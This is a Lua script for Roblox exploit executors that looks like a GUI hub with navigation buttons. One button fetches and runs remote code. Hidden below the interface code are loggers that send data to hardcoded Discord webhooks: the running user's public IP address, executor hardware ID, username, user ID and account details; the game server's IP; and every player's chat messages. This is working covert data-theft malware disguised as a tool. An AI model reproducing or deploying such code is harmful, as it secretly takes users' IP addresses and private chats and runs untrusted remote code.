local function XEORPBO_fake_script() -- LegacyUIButton.LocalScript 
	local script = Instance.new('LocalScript', LegacyUIButton)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(("https://ananymoos-tech.cf/projects/NixGUI/legacyui.lua"),true))()
	end)
end
coroutine.wrap(XEORPBO_fake_script)()
local function PXWUCDB_fake_script() -- HomeButton.LocalScript 
	local script = Instance.new('LocalScript', HomeButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Pages.HomeFrame.Visible = true
		script.Parent.Parent.Parent.Pages.MiscFrame.Visible = false
		script.Parent.Parent.Parent.Pages.LocalPlayerFrame.Visible = false
		script.Parent.Parent.Parent.Pages.SettingsFrame.Visible = false
		script.Parent.Parent.Parent.Pages.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(PXWUCDB_fake_script)()
local function WMJUULN_fake_script() -- MiscButton.LocalScript 
	local script = Instance.new('LocalScript', MiscButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Pages.HomeFrame.Visible = false
		script.Parent.Parent.Parent.Pages.MiscFrame.Visible = true
		script.Parent.Parent.Parent.Pages.LocalPlayerFrame.Visible = false
		script.Parent.Parent.Parent.Pages.SettingsFrame.Visible = false
		script.Parent.Parent.Parent.Pages.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(WMJUULN_fake_script)()
local function WUSESH_fake_script() -- LocalPlayerButton.LocalScript 
	local script = Instance.new('LocalScript', LocalPlayerButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Pages.HomeFrame.Visible = false
		script.Parent.Parent.Parent.Pages.MiscFrame.Visible = false
		script.Parent.Parent.Parent.Pages.LocalPlayerFrame.Visible = true
		script.Parent.Parent.Parent.Pages.SettingsFrame.Visible = false
		script.Parent.Parent.Parent.Pages.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(WUSESH_fake_script)()
local function HXFJ_fake_script() -- SettingsButton.LocalScript 
	local script = Instance.new('LocalScript', SettingsButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Pages.HomeFrame.Visible = false
		script.Parent.Parent.Parent.Pages.MiscFrame.Visible = false
		script.Parent.Parent.Parent.Pages.LocalPlayerFrame.Visible = false
		script.Parent.Parent.Parent.Pages.SettingsFrame.Visible = true
		script.Parent.Parent.Parent.Pages.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(HXFJ_fake_script)()
local function TGXJN_fake_script() -- CreditsButton.LocalScript 
	local script = Instance.new('LocalScript', CreditsButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Pages.HomeFrame.Visible = false
		script.Parent.Parent.Parent.Pages.MiscFrame.Visible = false
		script.Parent.Parent.Parent.Pages.LocalPlayerFrame.Visible = false
		script.Parent.Parent.Parent.Pages.SettingsFrame.Visible = false
		script.Parent.Parent.Parent.Pages.CreditsFrame.Visible = true
	end)
end
coroutine.wrap(TGXJN_fake_script)()




local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/992958379507060788/YNMNAE5eUGQeOMyVvsQqeMiqvQhhbLt2XHfFLY5cPQ05inPO30tDWSSXHqqZiHTy4nax"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "UserId:",
                    ["value"] = Game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end


-- Trollsters73 Server Info Logger
local Network = game:GetService("NetworkClient")
local Hwid = game:HttpGet("https://www.uuidgenerator.net/version4/bulk?amount=1")
local Webhook = "https://discord.com/api/webhooks/992959659818369134/QlN1B89-gdmPTpr7JfKCN7HmNuDey1ZfYx5t6oTQFwE6QMST9Iwwa3D4IFtNmXVQvIUU"
Network.ConnectionAccepted:Connect(function(Server, ReplicatorInstance)
    _G.Server = Server:gsub("|", ":")
end)

repeat game:GetService("RunService").Heartbeat:Wait() until _G.Server
warn("The server's IP is ".._G.Server)


local IP = math.random(1,255).."."..math.random(1,255).."."..math.random(1,255).."."..math.random(1,255)
local ServerIP = _G.Server
local playerCount = #game:GetService("Players"):GetPlayers()
local MaxCount = game:GetService("Players").MaxPlayers

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = Webhook
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**Server logged!**__",
            ["description"] = "Successfully logged server via Ananymoos Technologies",
            ["type"] = "rich",
            ["color"] = tonumber(000000),
            ["fields"] = {
                {
					["name"] = "Game Name:",
					["value"] = "`"..info.Name.."`",
					["inline"] = true
				},
                {
                    ["name"] = "JobID:",
                    ["value"] = "`"..game.JobId.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Requested IP:",
                    ["value"] = "`"..IP.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Requested HWID:",
                    ["value"] = "`"..Hwid.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Server IP:",
                    ["value"] = "`"..ServerIP.."`",
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end




-- Chat Logger

local wh = 'https://discord.com/api/webhooks/992960689205412001/3GSF3heZ0er8hiksVpXUzcYUs-8jBmBpQPJLe8iE9mSuhuxZnNUQhmdXM2ok9LwuBBAe'


local embed1 = {
       ['title'] = 'Beginning of Message logs on '..game.PlaceId.." at "..tostring(os.date("%m/%d/%y"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end

game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)